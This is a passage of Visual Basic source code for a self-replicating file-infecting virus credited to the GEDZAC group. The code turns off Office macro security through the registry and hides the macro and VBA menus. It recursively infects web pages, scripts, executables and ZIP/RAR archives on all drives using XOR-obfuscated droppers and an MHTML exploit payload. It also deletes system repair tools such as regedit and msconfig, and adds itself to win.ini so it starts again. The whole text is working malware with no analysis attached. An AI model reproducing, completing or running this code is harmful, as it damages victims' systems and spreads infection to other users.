   "Application.ScreenUpdating = x(¢Afktb¢)" & vbCrLf & "Application.DisplayStatusBar = x(¢Afktb¢)" & vbCrLf & _
   "Application.DisplayAlerts = x(¢Afktb¢)" & vbCrLf & "Application.EnableCancelKey = 0" & vbCrLf & _
   "Application.CommandBars(x(¢Pnichp¢)).Controls(4).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Qnbp¢)).Controls(3).Enabled = x(¢Afktb¢)" & vbCrLf

   X4 = "Application.CommandBars(x(¢Qntrfk'Eftnd¢)).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(x(¢Jfduh¢)).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(11).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(12).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "Application.CommandBars(x(¢Shhkt¢)).Controls(13).Enabled = x(¢Afktb¢)" & vbCrLf & _
   "End If" & vbCrLf & "End Sub" & vbCrLf & "Private Function x(c)" & vbCrLf & "On Error Resume Next" & vbCrLf & _
   "For i = 1 To Len(c)" & vbCrLf & "x = x & Chr(Asc(Mid(c, i, 1)) Xor 7)" & vbCrLf & "Next" & vbCrLf & _
   "End Function" & vbCrLf

   MCV = X1 & X2 & X3 & X4
   MCV = Replace(MCV, "¢", Chr(34)): Cmx.Write MCV
   Cmx.Close

   If Axl.CodeModule.CountOfLines > 0 Then Axl.CodeModule.DeleteLines 1, Axl.CodeModule.CountOfLines

   Set Xmc = Fs.OpenTextFile(Sp(1) & "\mcx.vir")
   i = 1
   Do While Xmc.AtendOfstream <> True
   Lx = Xmc.ReadLine
   DoEvents
   Axl.CodeModule.InsertLines i, Lx: i = i + 1
   Loop
   Xmc.Close

   FileCopy Sp(1) & "\Multi-Infect.dll", Sp(2) & "\Template.xls.scr"
   Xl.Worksheets(1).Shapes.AddOLEObject Left:=100, Top:=100, _
       Width:=200, Height:=300, _
       FileName:=Sp(2) & "\Template.xls.scr", link:=False

   Xl.ActiveWorkBook.SaveAs Xl.StartupPath & "\Template.xls"
   Set Axl = Nothing: SA Xl.StartupPath & "\Template.xls", 1
   Else
   Kill Xl.StartupPath & "\*.*"
   End If
   Xl.Quit
   Set Xl = Nothing
   End Sub

   Sub DisabledXS(Xl)
   On Error Resume Next

   If Int(Xl.Version) > 8 Then
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Excel\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Excel\Security\AccessVBOM", 1, "REG_DWORD"
   Rw "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\10.0\Excel\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security\Level", 1, "REG_DWORD"
   Rw "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\9.0\Excel\Security\Level", 1, "REG_DWORD"
   Xl.ScreenUpdating = False
   Xl.DisplayStatusBar = False
   Xl.DisplayAlerts = False
   Xl.EnableCancelKey = 0
   Xl.CommandBars("View").Controls(3).Enabled = False
   Xl.CommandBars("Visual Basic").Enabled = False
   Xl.CommandBars("Tools").Controls("Macro").Enabled = False
   Xl.CommandBars("Tools").Controls(12).Enabled = False
   Xl.CommandBars("Tools").Controls(13).Enabled = False
   Xl.CommandBars("Window").Controls(4).Enabled = False
   Xl.CommandBars("Tools").Controls(14).Enabled = False

   ElseIf Int(Xl.Version) < 9 Then
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6", 0, "REG_DWORD"
   Xl.ScreenUpdating = False
   Xl.DisplayStatusBar = False
   Xl.DisplayAlerts = False
   Xl.EnableCancelKey = 0
   Xl.CommandBars("View").Controls(3).Enabled = False
   Xl.CommandBars("Visual Basic").Enabled = False
   Xl.CommandBars("Tools").Controls("Macro").Enabled = False
   Xl.CommandBars("Tools").Controls(11).Enabled = False
   Xl.CommandBars("Tools").Controls(12).Enabled = False
   Xl.CommandBars("Tools").Controls(13).Enabled = False
   Xl.CommandBars("Window").Controls(4).Enabled = False
   End If
   End Sub

   Function Sp(x)
   On Error Resume Next
   Select Case x
   Case 0: Sp = Fs.GetSpecialFolder(0)
   Case 1: Sp = Fs.GetSpecialFolder(1)
   Case 2: Sp = Fs.GetSpecialFolder(2)
   Case 3
   Exn = App.Path
   If Right(Exn, 1) <> "\" Then Exn = Exn & "\"
   Exs = Array(".exe", ".com", ".pif", ".scr", ".bat")
   For i = 0 To 4
   If Dir(Exn & App.EXEName & Exs(i)) <> "" Then Sp = Exn & App.EXEName & Exs(i): Exit For
   Next
   End Select
   End Function

   Sub SA(P, a)
   On Error Resume Next: SetAttr P, a
   End Sub

   Function Rm()
   On Error Resume Next
   Randomize
   For i = 1 To 7
   r = Int(Rnd * 55) + 66: If r = 92 Then r = 96
   Rm = Rm & Chr(r)
   Next
   End Function


   Sub WIni(I_S As String, IK As String, IV As String, IP As String)
   On Error Resume Next: Dim Wn As Long
   Wn = WritePrivateProfileString(I_S, IK, IV, IP)
   End Sub

   Sub Rw(r, k, t)
   On Error Resume Next
   If t = "" Then Sw.RegWrite r, k Else Sw.RegWrite r, k, "REG_DWORD"
   End Sub

   Function Rr(r)
   On Error Resume Next: Rr = Sw.RegRead(r)
   End Function

   Function IniR(NS, NK, ND)
   On Error Resume Next: Dim k As String
   k = NK: Dim St As String * 400: Dim i As Long
   i = GetPrivateProfileString(NS, k, "", St, Len(St), ND)
   IniR = Left(St, i)
   End Function

   Sub Variables()
   On Error Resume Next
   Set Sd = CreateObject("Scripting.Dictionary")

   Sd.Add "html", 1: Sd.Add "htm", 2
   Sd.Add "php", 4: Sd.Add "asp", 5: Sd.Add "shtml", 6: Sd.Add "shtm", 7: Sd.Add "phtml", 8: Sd.Add "phtm", 9
   Sd.Add "plg", 11: Sd.Add "htx", 12: Sd.Add "mht", 13: Sd.Add "mhtml", 14

   n = FrFile
   Open Sp(1) & "\Multi-Infect.dll" For Binary Access Read As n
   Vx = Space(LOF(n))
   Get n, , Vx
   Close n

   CodeB64 = B64(Sp(1) & "\Multi-Infect.dll")
   CodeScript1 = "MIME-Version: 1.0" & vbCrLf & "Content-Location:file:///Multi-Infector.exe" & vbCrLf & "Content-Transfer-Encoding: base64" & vbCrLf & _
   CodeB64 & vbCrLf & "<Script Language = 'VBScript'>" & vbCrLf

   CodeScript2 = vbCrLf & "id = setTimeout(" & Chr(34) & "MI()" & Chr(34) & ", 150)" & vbCrLf & "Sub MI()" & vbCrLf & _
   "Vpt = LCase(Document.url)" & vbCrLf & "Vtx=" & Chr(34) & "<object style=$cursor:cross-hair$ classid=$clsid:22222222-2222-2222-2222$  CODEBASE=$mhtml:" & Chr(34) & "&Vpt&" & Chr(34) & "!file:///Multi-Infector.exe$></object>" & Chr(34) & vbCrLf & _
   "Vtx = Replace(Vtx, " & Chr(34) & "$" & Chr(34) & ", Chr(34)): Document.Write (Vtx) & vbCrLf & Capside" & vbCrLf & _
   "End Sub" & vbCrLf & "Function E(code)" & vbCrLf & "For i = 1 To Len(code)" & vbCrLf & _
   "Ck = Asc(Mid(code, i, 1))" & vbCrLf & "If Ck = Asc(" & Chr(34) & "¥" & Chr(34) & ") Then" & vbCrLf & _
   "E = E & " & Chr(34) & "%" & Chr(34) & vbCrLf & "ElseIf Ck = 28 Then" & vbCrLf & _
   "E = E & Chr(13)" & vbCrLf & "ElseIf Ck = 29 Then" & vbCrLf & _
   "E = E & Chr(10)" & vbCrLf & "Else" & vbCrLf & _
   "E = E & Chr(Ck Xor 7)" & vbCrLf & "End If" & vbCrLf & _
   "Next" & vbCrLf & "End Function" & vbCrLf & "</Script>"

   VBSMf = "REM Multi-Infector" & vbCrLf & "Set Fg = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")" & vbCrLf & _
   "Set Wg = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")" & vbCrLf & _
   "If Fg.FileExists(Fg.GetSpecialFolder(1)&" & Chr(34) & "\Multi-Infect.dll" & Chr(34) & ") = False Then" & vbCrLf & _
   "MF = E(" & Chr(34) & "FM" & Chr(34) & ")" & vbCrLf & _
   "Set Fh = Fg.CreateTextFile(Fg.GetSpecialFolder(1)&" & Chr(34) & "\WinLoad.htm" & Chr(34) & ")" & vbCrLf & _
   "Fh.Write MF" & vbCrLf & "Fh.Close" & vbCrLf & "Wg.Run Fg.GetSpecialFolder(1)&" & Chr(34) & "\WinLoad.htm" & Chr(34) & vbCrLf & "End if" & vbCrLf & _
   "Function E(code)" & vbCrLf & "For i = 1 To Len(code)" & vbCrLf & _
   "Ck = Asc(Mid(code, i, 1))" & vbCrLf & "If Ck = Asc(" & Chr(34) & "¥" & Chr(34) & ") Then" & vbCrLf & _
   "E = E & " & Chr(34) & "%" & Chr(34) & vbCrLf & "ElseIf Ck = 28 Then" & vbCrLf & _
   "E = E & Chr(13)" & vbCrLf & "ElseIf Ck = 29 Then" & vbCrLf & _
   "E = E & Chr(10)" & vbCrLf & "Else" & vbCrLf & _
   "E = E & Chr(Ck Xor 7)" & vbCrLf & "End If" & vbCrLf & _
   "Next" & vbCrLf & "End Function"

   CodMp = "'<!GEDZAC>" & vbCrLf & "Sub MultiInfector()" & vbCrLf & _
   "On Error Resume Next: Dim Fs As Object" & vbCrLf & _
   "Set Fs = CreateObject(p(¢Tdunwsni`)AnkbT~tsbjHembds¢))" & vbCrLf & _
   "Sc = ActivePresentation.Slides.Count: Sc = Sc - (Sc - 1)" & vbCrLf & _
   "Set At = ActivePresentation.Slides(Sc)" & vbCrLf & _
   "For i = 1 To At.Shapes.Count" & vbCrLf & _
   "If LCase(At.Shapes(i).Name) = LCase(p(¢Ja¢)) Then" & vbCrLf & _
   "If Not (Fs.FileExists(Fs.GetSpecialFolder(1) & p(¢[Jrksn*Niabds)ckk¢))) Then" & vbCrLf & _
   "At.Shapes(i).Visible = True" & vbCrLf & "At.Shapes(i).OLEFormat.Activate" & vbCrLf & _
   "Else" & vbCrLf & "At.Shapes(i).Visible = False" & vbCrLf & "End If" & vbCrLf & "End If" & vbCrLf & _
   "Next" & vbCrLf & "End Sub" & vbCrLf & "Private Function p(x)" & vbCrLf & "On Error Resume Next" & vbCrLf & _
   "For i = 1 To Len(x)" & vbCrLf & "p = p & Chr(Asc(Mid(x, i, 1)) Xor 7)" & vbCrLf & "Next" & vbCrLf & "End Function"

   CodMp = Replace(CodMp, "¢", Chr(34))

   Vms = CodeScript1 & CodeScript2

   For i = 1 To Len(Vms)
   Ck = Asc(Mid(Vms, i, 1))
   If Ck = Asc("%") Then
   EC = EC & "¥"
   ElseIf Ck = 13 Then
   EC = EC & Chr(28)
   ElseIf Ck = 10 Then
   EC = EC & Chr(29)
   Else
   EC = EC & Chr(Ck Xor 7)
   End If
   Next

   VBSMf = Replace(VBSMf, "FM", EC)

   wzt = False
   wzp = Rr("HKEY_CLASSES_ROOT\WinZip\shell\open\command\")
   wzp = Mid(wzp, 1, Len(wzp) - 5)
   If (wzp <> "") And (InStr(LCase(wzp), "winzip") <> 0) Then wzt = True
   If Fs.FileExists(Sp(1) & "\WzDat.dat") Then
   Set Wd = Fs.OpenTextFile(Sp(1) & "\WzDat.dat")
   wzx = Wd.ReadAll
   Wd.Close
   Else
   Set Wd = Fs.CreateTextFile(Sp(1) & "\WzDat.dat")
   Wd.Write "Multi-Infector" & vbCrLf
   Wd.Close
   wzx = Space(3)
   End If

   wrt = False
   wrp = Rr("HKEY_CLASSES_ROOT\WinRAR\shell\open\command\")
   wrp = Mid(wrp, 2, Len(wrp) - 17) & "rar"
   If (wrp <> "") And (InStr(LCase(wrp), "winrar") <> 0) Then wrt = True
   If Fs.FileExists(Sp(1) & "\WrDat.dat") Then
   Set Wa = Fs.OpenTextFile(Sp(1) & "\WrDat.dat")
   wrx = Wa.ReadAll
   Wa.Close
   Else
   Set Wa = Fs.CreateTextFile(Sp(1) & "\WrDat.dat")
   Wa.Write "Multi-Infector" & vbCrLf
   Wa.Close
   wrx = Space(3)
   End If

   Wm1(0) = "\WinCs.scr": Wm1(1) = "\WCompress.scr": Wm1(2) = "\TempFile.bat": Wm1(3) = "\Extrac.com": Wm1(4) = "\WinX.scr"
   For i = 0 To 4
   If Not (Fs.FileExists(Sp(2) & Wm1(i))) Then FileCopy Sp(1) & "\Multi-Infect.dll", Sp(2) & Wm1(i)
   Next
   End Sub

   Sub VBSInfected(rp)
   On Error Resume Next: SA rp, 0
   Set V1 = Fs.OpenTextFile(rp)
   Vr1 = V1.ReadLine
   If InStr(Vr1, "REM Multi-Infector") <> 0 Then
   V1.Close
   Exit Sub
   Else
   Vr2 = Vr1 & vbCrLf & V1.ReadAll: V1.Close
   End If

   For i = 1 To Len(Vr2)
   Ck1 = Asc(Mid(Vr2, i, 1))
   If Ck1 = Asc("%") Then
   EC1 = EC1 & "¥"
   ElseIf Ck1 = 13 Then
   EC1 = EC1 & Chr(28)
   ElseIf Ck1 = 10 Then
   EC1 = EC1 & Chr(29)
   Else
   EC1 = EC1 & Chr(Ck1 Xor 7)
   End If
   Next

   Set V2 = Fs.OpenTextFile(rp, 2, 1)
   V2.Write VBSMf & vbCrLf & "CodVB=" & Chr(34) & EC1 & Chr(34) & vbCrLf & "Execute E(CodVB)"
   V2.Close

   End Sub

   Sub HtmlInfected(rp)
   On Error Resume Next: SA rp, 0
   Set H1 = Fs.OpenTextFile(rp)
   Hr1 = H1.ReadLine
   If InStr(Hr1, "MIME") <> 0 Then
   H1.Close
   Exit Sub
   Else
   Hr2 = H1.ReadAll: H1.Close
   End If

   For i = 1 To Len(Hr2)
   Ck = Asc(Mid(Hr2, i, 1))
   If Ck = Asc("%") Then
   EC = EC & "¥"
   ElseIf Ck = 13 Then
   EC = EC & Chr(28)
   ElseIf Ck = 10 Then
   EC = EC & Chr(29)
   Else
   EC = EC & Chr(Ck Xor 7)
   End If
   Next

   EC = "Capside = E(" & Chr(34) & EC & Chr(34) & ")"

   Set H2 = Fs.OpenTextFile(rp, 2, 1)
   H2.Write CodeScript1 & EC & CodeScript2
   H2.Close

   End Sub

   Public Function B64(ByVal vsFullPathname)
   On Error Resume Next
   Dim b           As Integer: Dim Base64Tab  As Variant
   Dim bin(3)      As Byte: Dim s, sResult As String: Dim l, i, FileIn, n As Long

   Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

   Erase bin: l = 0: i = 0: FileIn = 0: b = 0: s = "": FileIn = FreeFile

   Open vsFullPathname For Binary As FileIn
   sResult = s & vbCrLf: s = "": l = LOF(FileIn) - (LOF(FileIn) Mod 3)
   For i = 1 To l Step 3

   Get FileIn, , bin(0): Get FileIn, , bin(1): Get FileIn, , bin(2)

   If Len(s) > 64 Then
   s = s & vbCrLf: sResult = sResult & s: s = ""
   End If

   b = (bin(n) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): b = bin(n + 2) And &H3F: s = s & Base64Tab(b)
   Next i

   If Not (LOF(FileIn) Mod 3 = 0) Then
   For i = 1 To (LOF(FileIn) Mod 3)
   Get FileIn, , bin(i - 1)
   Next i
   If (LOF(FileIn) Mod 3) = 2 Then
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): s = s & "="
   Else
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): s = s & "=="
   End If
   End If

   If s <> "" Then
   s = s & vbCrLf: sResult = sResult & s
   End If
   s = ""
   Close FileIn: B64 = sResult
   End Function

   Sub MDisk()
   On Error Resume Next
   Set Vd = Fs.Drives
   For Each Vdt In Vd
   If (Vdt.DriveType = 2) Or (Vdt.DriveType = 3) Then MFolder Vdt.Path & "\"
   Next
   End Sub

   Sub MFolder(F)
   On Error Resume Next
   Set Cfl = Fs.GetFolder(F)
   Set Cfs = Cfl.Subfolders
   For Each Fl In Cfs
   MFiles Fl.Path: MFolder Fl.Path
   Next
   End Sub

   Sub MFiles(F)
   On Error Resume Next
   Set fls = Fs.GetFolder(F): Set fs1 = fls.Files
   For Each Fh In fs1
   fx = LCase(Fs.GetExtensionName(Fh.Path))
   Fns = LCase(Fh.Name): Fnz = LCase(Fs.GetBaseName(Fh.Path))

   If Sd.Exists(fx) = True Then
   HtmlInfected (Fh.Path)

   ElseIf (fx = "exe") Or (fx = "scr") Then
   ExeInfected (Fh.Path)
   If (Fns = "msconfig.exe") Or (Fns = "drwatson.exe") Or (Fns = "sfc.exe") Or (Fns = "regedit.exe") Or (Fns = "sysedit.exe") Or (Fns = "regedt32.exe") Then Fs.DeleteFile (Fh.Path)

   ElseIf (fx = "vbs") Or (fx = "vbe") Then
   VBSInfected (Fh.Path)

   ElseIf (fx = "zip") Then
   ZipInfected MsD(Fh.Path), Fnz

   ElseIf (fx = "rar") Then
   RarInfected MsD(Fh.Path), Fnz

   ElseIf Fns = "win.ini" Then
   Rm3 = Rm: FileCopy Sp(1) & "\Multi-Infect.dll", F & "\" & Rm3 & ".exe": SA F & "\" & Rm3 & ".exe", 6
   WIni "windows", "run", F & "\" & Rm3 & ".exe", Fh.Path

   End If
   Next
   End Sub

   Function MsD(x)
   On Error Resume Next
   Msn = Split(x, "\")
   For i = 0 To UBound(Msn) - 1
   If Len(Msn(i)) > 8 Then
   If InStr(Msn(i), Space(1)) <> 0 Then Msn(i) = Replace(Msn(i), Space(1), "")
   Mn1 = Left(Msn(i), 6) & "~1" & "\"
   Else
   If InStr(Msn(i), Space(1)) <> 0 Then Msn(i) = Replace(Msn(i), Space(1), "")
   Mn1 = Msn(i) & "\"
   End If
   MsD = MsD & Mn1
   Next
   MsD = MsD & Msn(UBound(Msn))
   End Function

   Sub Mensage()
   On Error Resume Next ' :)
   MsgBox "W32/MuLti-InFecTor by MachineDramon/GEDZAC  -  Falckon/GEDZAC" & vbCrLf & _
   "Hecho en LatinoAmerica (Perú - Mexico)" & vbCrLf & _
   "Derechos reservados", 15, "W32/MuLti-InFecTor"

   MsgBox "Gracias por Preferir Nuestro Producto", 15, "W32/MuLti-InFecTor"

   MsgBox "El 26 de Abril es el día de la Tierra" & vbCrLf & _
   "¿Que hiciste tú este año para proteger nuestro planeta?", 15, "W32/MuLti-InFecTor"
   End Sub
